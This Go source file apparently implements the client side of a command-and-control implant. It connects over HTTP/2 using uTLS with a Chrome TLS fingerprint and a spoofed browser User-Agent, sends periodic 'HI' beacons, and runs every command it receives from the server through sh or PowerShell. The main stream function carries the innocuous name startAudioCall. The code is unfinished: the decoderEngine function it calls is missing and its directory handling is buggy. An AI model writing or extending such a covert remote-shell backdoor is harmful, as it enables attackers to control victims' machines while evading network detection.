package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"time"
	"sync"
	"runtime"
	"os/exec"
	"strings"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

func dialH2()(*http2.ClientConn, error){

	tcpConn, err := net.Dial("tcp", "127.0.0.1:8443")
	if err != nil {
		fmt.Println("tcp dial:", err)
		return nil, err
	}

	//uTLS with h2 ALPN
	config := &utls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         "localhost",
	}
	uConn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)

	if err := uConn.Handshake(); err != nil {
		fmt.Println("utls handshake:", err)
		return nil, err
	}

	//verify h2 negotiation from server
	if uConn.ConnectionState().NegotiatedProtocol != "h2" {
		fmt.Println("h2 not negotiated, got:",
			uConn.ConnectionState().NegotiatedProtocol)
		return nil, nil //need an err here
	}
	fmt.Println("client: h2 negotiated via uTLS")

	//http2 transport over uTLS conn
	transport := &http2.Transport{}
	clientConn, err := transport.NewClientConn(uConn)
	if err != nil {
		fmt.Println("http2 NewClientConn:", err)
		return nil, err
	}

	return clientConn, nil
}

func startAudioCall(clientConn *http2.ClientConn){
	// io.Pipe — pw is what we write "HI" to
	//           pr feeds into the request body the server reads
	pr, pw := io.Pipe()

	req, err := http.NewRequest("POST", "https://localhost:8443/echo", pr)
	if err != nil {
		log.Fatal("new request:", err)
	}
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"+
		" AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	// RoundTrip sends request headers and returns once response headers arrive
	// pr keeps streaming request body data to server after this returns
	// this is the HTTP/2 difference from HTTP/1.1 — headers and body are decoupled
	resp, err := clientConn.RoundTrip(req)
	if err != nil {
		log.Fatal("roundtrip:", err)
	}
	fmt.Println("client: connected, proto:", resp.Proto)

	var wg sync.WaitGroup

	// goroutine 1: write HI to server every 5 seconds via pw
	wg.Go(func() {
		defer pw.Close() // closing pw signals EOF to server's r.Body
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			t := <-ticker.C
			msg := fmt.Sprintf("HI from client @ %s\n", t.Format("15:04:05"))
			if _, err := fmt.Fprint(pw, msg); err != nil {
				return
			}
			fmt.Printf("client sent: %s", msg)
		}
	})

	// goroutine 2: read HELLO from server via resp.Body (blocks until server writes)
	wg.Go(func() {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		for {
			n, err := resp.Body.Read(buf)
			if n > 0 {
				cmd, _ := decoderEngine(buf) //might need to catch isFullCmd
				fmt.Println("command ", cmd)
				executeCommand(cmd)
			}
			if err != nil {
				return
			}
		}
	})
	wg.Wait()
}

var targetDir string
func executeCommand(finalCommand string){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		var formatted_out string
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		args := strings.Fields(finalCommand)
		switch args[0]{
		case "cd":
			targetDir ="/"
			if len(args)>1{
				if targetDir == "../"||targetDir == "../../"{
					targetDir = targetDir+args[1]
				}
				targetDir=args[1]
			}
		}
		//validate targetDir
		cmd.Dir = targetDir //either this, or os.Chdir, but we would need os.Stat and os.isDir or something for that
		res, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
        		formatted_out = fmt.Sprintf("%s", string(exitErr.Stderr))
    		}else{
    			formatted_out = "unknown error for " + finalCommand
    		}
		}else{
			formatted_out = strings.TrimSpace(string(res))
		}

		fmt.Println("formatted_out = ", formatted_out)
		//fmt.Println("output length - ", len(formatted_out)) 
	}
}

func main() {
	
	clientConn, _ := dialH2()
	startAudioCall(clientConn)

}